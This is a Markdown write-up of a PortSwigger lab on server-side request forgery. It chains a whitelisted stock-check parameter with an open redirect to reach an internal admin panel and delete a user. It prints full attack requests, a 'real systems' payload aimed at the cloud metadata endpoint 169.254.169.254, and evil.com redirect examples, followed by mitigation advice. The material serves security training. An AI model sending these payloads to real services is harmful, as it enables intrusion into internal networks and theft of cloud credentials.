# 📘 PortSwigger Lab: SSRF with filter bypass via open redirection

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection  
> 🎯 Topic: Server-Side Request Forgery (SSRF) — bypassing a whitelist filter via open redirect  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🚫 The stockApi Restriction — Whitelist](#whitelist)
- [🔀 What Is an Open Redirect](#open-redirect)
- [🧱 How the nextProduct Function Works](#next-product)
- [🔗 Building the Chain](#chain)
- [🔍 Step 1 — Intercept the Stock Check Request](#step1)
- [🔍 Step 2 — Confirm the Whitelist Restriction](#step2)
- [🔍 Step 3 — Find and Confirm the Open Redirect](#step3)
- [🔍 Step 4 — Bypass the Whitelist via the Redirect](#step4)
- [🔍 Step 5 — Delete User carlos](#step5)
- [📨 Example Requests](#requests)
- [📥 Example Responses](#responses)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use the stock check feature to:

```text
1. Reach the admin interface at http://192.168.0.12:8080/admin,
   despite the whitelist restriction on stockApi.

2. Delete the user carlos.
```

---

<a id="theory"></a>

## 🧠 Short Theory

In this lab `stockApi` is **restricted by a whitelist**: the server only allows requests to the local application. Direct SSRF to internal addresses is blocked:

```text
stockApi=http://192.168.0.12:8080/admin  → blocked
```

But the application itself has an **open redirect**: the "next product" function (`/product/nextProduct`) takes the `path` parameter and places it into the `Location` header without validation. The attacker controls `path` → the attacker controls the redirect target.

The combination of two vulnerabilities gives full SSRF:

```text
SSRF (restricted by whitelist) + Open redirect = SSRF (unrestricted)
```

---

<a id="idea"></a>

## 🧩 Core Idea

The filter checks **only the first URL** in the chain of requests. It does not control where the server goes **after the redirect**.

```text
The filter sees:  the local application URL      → allowed ✅
Reality:          the local URL responds with 302
                  → the client follows the redirect
                  → the request goes to 192.168.0.12:8080/admin ✅
```

The chain exploits a fundamental weakness of any SSRF filter:

```text
The filter controls the FIRST request,
but it does not control the REDIRECTS
that the HTTP client follows.
```

---

<a id="whitelist"></a>

## 🚫 The stockApi Restriction — Whitelist

Unlike the blacklist lab, URL tricks with `@`, `#`, or alternative IPs do not work here:

```text
stockApi=http://127.0.0.1/admin            → blocked
stockApi=http://192.168.0.12:8080/admin    → blocked
stockApi=https://evil.com/admin            → blocked
```

Only one case is allowed:

```text
stockApi=http://LAB-ID.web-security-academy.net/...   → allowed
```

Such a whitelist is stronger than a blacklist, but it has a weak spot — **it checks the start of the URL, not the whole request chain**. If the allowed domain itself can redirect (open redirect) — the whitelist becomes a gateway anywhere.

---

<a id="open-redirect"></a>

## 🔀 What Is an Open Redirect

An open redirect is a vulnerability where the application redirects the user to an attacker-controlled address without validation.

Typical cause:

```python
target = request.args["path"]
return redirect(target)   # no scheme/host validation
```

The parameter is reflected into `Location` as-is:

```text
GET /product/nextProduct?path=http://evil.com
→ 302 Location: http://evil.com
```

Open redirect indicators — parameters that end up in a redirect or link without validation:

```text
path   url   redirect   next   dest   return   goto
```

---

<a id="next-product"></a>

## 🧱 How the nextProduct Function Works

The "next product" request:

```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: LAB-ID.web-security-academy.net
```

Response:

```http
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The `path` parameter is placed into `Location` **without validation**. This is an open redirect: whoever controls `path` controls where any HTTP client of this application goes.

---

<a id="chain"></a>

## 🔗 Building the Chain

```text
1. stockApi = /product/nextProduct?path=http://192.168.0.12:8080/admin
                                     └──────── open redirect ────────┘

2. Filter:   hostname = LAB-ID.web-security-academy.net  → allowed ✅

3. Server:   GET /product/nextProduct?path=http://192.168.0.12:8080/admin

4. Response: 302 Found, Location: http://192.168.0.12:8080/admin

5. The HTTP client FOLLOWS the redirect
   → GET http://192.168.0.12:8080/admin
   → the admin response is returned in the stock response
```

---

<a id="step1"></a>

## 🔍 Step 1 — Intercept the Stock Check Request

1. Open any product page.
2. Enable interception in Burp Proxy (Intercept on).
3. Click:

```text
Check stock
```

4. Intercept the request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

5. Send it to Repeater:

```text
Right click → Send to Repeater
```

---

<a id="step2"></a>

## 🔍 Step 2 — Confirm the Whitelist Restriction

Try a direct request to the target:

```text
stockApi=http://192.168.0.12:8080/admin
```

Expected response — a block (a message like "External stock check blocked" or "only the local application is allowed").

Map the filter:

```text
stockApi=http://192.168.0.12:8080/admin   → blocked (internal address)
stockApi=http://127.0.0.1/admin           → blocked (loopback)
stockApi=https://evil.com/admin           → blocked (foreign domain)
stockApi=http://LAB-ID.web-security-academy.net/...  → allowed
```

Conclusion: the whitelist is strict — direct bypasses do not work; a **bypass through the application itself** is needed.

---

<a id="step3"></a>

## 🔍 Step 3 — Find and Confirm the Open Redirect

1. Open a product page.
2. Find the **Next product** link/button and click it.
3. Intercept the request:

```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

4. Examine the response:

```http
HTTP/2 302 Found
Location: /product?productId=2
```

The `path` parameter is reflected into `Location` — suspicion of an open redirect.

5. Confirm in Repeater — put the internal address into `path`:

```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: LAB-ID.web-security-academy.net
```

Response:

```http
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Open redirect confirmed ✅

---

<a id="step4"></a>

## 🔍 Step 4 — Bypass the Whitelist via the Redirect

Give the stock checker a local URL with the open redirect parameter:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Full request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

What happens:

```text
1. Filter:   hostname is local → allowed
2. Server:   GET /product/nextProduct?path=http://192.168.0.12:8080/admin
3. Response: 302 Location: http://192.168.0.12:8080/admin
4. Client:   follows the redirect → GET http://192.168.0.12:8080/admin
5. The admin response is returned in the stock response
```

Success indicator: `200 OK` with the admin HTML — the `Users` heading, a user list with `Delete` links.

---

<a id="step5"></a>

## 🔍 Step 5 — Delete User carlos

In the admin HTML find the link:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

Append the deletion path to `path`:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Full request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

If the server parses `&` inside the value oddly — encode the `?` inside `path`:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3fusername=carlos
```

The lab is marked:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Example Requests

### Original (legitimate)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

### Blocked direct SSRF (baseline)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

stockApi=http://192.168.0.12:8080/admin
```

Filter response (example):

```http
HTTP/1.1 400 Bad Request
...

External stock check blocked for: http://192.168.0.12:8080/admin
```

### nextProduct request with the internal address (open redirect confirmation)

```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

### Working — access to the admin panel via the redirect

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### Working — user deletion

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

<a id="responses"></a>

## 📥 Example Responses

### nextProduct response with the internal address

```http
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

### Stock response after the redirect (admin panel)

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```

### Response to the deletion request

```http
HTTP/1.1 200 OK
...
```

and the lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the lab
2. Open a product page
3. Intercept POST /product/stock
4. Test stockApi=http://192.168.0.12:8080/admin → blocked (baseline)
5. Intercept GET /product/nextProduct?path=...
6. Notice that path goes into Location → open redirect
7. Confirm: path=http://192.168.0.12:8080/admin → 302 with the internal address
8. Send stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
9. The server follows the redirect → the admin panel opens
10. Find the link /admin/delete?username=carlos
11. Send stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
12. User carlos deleted
13. Lab marked as Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. The Filter Checks Only the First URL

The whitelist validates the hostname of `stockApi` — it is local, so it passes. Where the request goes after the redirect is not controlled by the filter.

### 2. The Server's HTTP Client Follows Redirects

The key condition of the exploit: the client executing `stockApi` requests supports redirects. In the lab — it does.

### 3. Open Redirect on the Allowed Domain

The application itself places the user-controlled `path` into `Location` without validation. The allowed domain becomes a "bridge" to anywhere.

### 4. The Combination Provides Escalation

```text
SSRF (restricted) + Open redirect = SSRF (unrestricted)
```

A restricted vulnerability is expanded to a full one through a second vulnerability — classic escalation.

### 5. The Internal Service Does Not Require Authentication

The admin panel at `192.168.0.12:8080` trusts internal requests — after the request is delivered through the redirect, the attacker gains full control.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When you see a restricted SSRF (whitelist) — do not try to break the filter immediately:

```text
Which application functions can redirect?
```

```text
Which parameters end up in Location or links without validation?
```

```text
path, url, redirect, next, dest, return, goto — all candidates
```

```text
Does the server's HTTP client follow redirects?
```

Observation skills for finding an open redirect:

```text
A normal click on "Next product" → a 302 in the response
The parameter is reflected into Location as-is
Put an external address into path → redirect to it
→ open redirect confirmed
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Direct SSRF (blocked)

```text
stockApi=http://192.168.0.12:8080/admin
```

### SSRF via open redirect (works)

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### Relative redirect (in real systems)

```text
stockApi=/product/nextProduct?path=/admin
```

### Redirect to cloud metadata (in real systems)

```text
stockApi=/product/nextProduct?path=http://169.254.169.254/latest/meta-data/
```

### Trying different redirect codes (in real systems)

```text
301  302  303  307  308  — clients handle them differently
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Trying to Bypass the Whitelist with URL Tricks

`@`, `#`, alternative IPs do not work here — the whitelist is strict. The bypass goes through the application itself.

### Mistake 2. Not Noticing the Open Redirect

You click "Next product" on autopilot and miss the 302 and the `path` parameter. That is where the second vulnerability hides.

### Mistake 3. Checking Only the Status, Ignoring Location

Confirming an open redirect is about the `Location` header value, not the 302 code itself.

### Mistake 4. Using the Full URL in stockApi When Not Needed

A relative path `/product/nextProduct?...` is enough — it passes the whitelist too (the hostname matches the request).

### Mistake 5. Forgetting to Encode Special Characters

`?` and `&` inside the `stockApi` value can break form parsing. If something fails — encode `?` as `%3f`.

### Mistake 6. Not Watching Content-Length

When manually changing the request body, ensure `Content-Length` matches the new length (Repeater updates it automatically by default).

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Whitelist + Validation at the Resolved-IP Level

Checking the hostname at the start of the URL is not enough — resolve and validate the final IP:

```text
127.0.0.0/8        loopback
10.0.0.0/8         private
172.16.0.0/12      private
192.168.0.0/16     private
169.254.169.254    cloud metadata
```

### 2. Do Not Follow Redirects

Disable automatic redirect following in the HTTP client that executes `stockApi` requests. If redirects are necessary — validate their target URL too.

### 3. Fix the Open Redirect

The `path` parameter must not go into `Location` without validation. Allow only relative paths and only known values:

```python
allowed_paths = {"/product?productId=2", "/product?productId=3"}
if path not in allowed_paths:
    return error
```

### 4. Allowlist of Internal Endpoints

Do not accept a URL from the user at all — use a server-side dictionary of allowed APIs.

### 5. Authenticate Internal Services

Admin panels and APIs must not trust requests just because of their network location.

### 6. Egress Filtering and Segmentation

Restrict where the application can connect (network policy, firewall).

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Intercepted the `POST /product/stock` request
- [ ] Found the `stockApi` parameter
- [ ] Sent the request to Repeater

### Confirming the Restriction

- [ ] `stockApi=http://192.168.0.12:8080/admin` → blocked
- [ ] Determined that the whitelist only allows the local application

### Finding the Open Redirect

- [ ] Intercepted the `GET /product/nextProduct?path=...` request
- [ ] Noticed that `path` goes into `Location`
- [ ] Confirmed: `path=http://192.168.0.12:8080/admin` → 302 with the internal address

### Exploitation

- [ ] `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin`
- [ ] Response contains the admin HTML (Users, Delete links)
- [ ] `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- [ ] User `carlos` deleted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved through **a combination of two vulnerabilities**:

```text
SSRF (restricted by whitelist) + Open redirect = SSRF (unrestricted)
```

Final chain:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

1. The filter allows the local URL
2. nextProduct responds with 302 to the internal address
3. The HTTP client follows the redirect
4. The request to the admin panel is performed on behalf of the server
5. carlos is deleted
```

Main lessons:

```text
An SSRF filter controls the FIRST request, but it does not control redirects.
```

```text
An open redirect on an allowed domain turns a whitelist into a gateway anywhere.
```

```text
A restricted vulnerability plus a second vulnerability equals full compromise (escalation).
```

```text
Mitigation: do not follow redirects, validate the final IP, fix the open redirect.
```

---

[⬆ Back to top](#top)
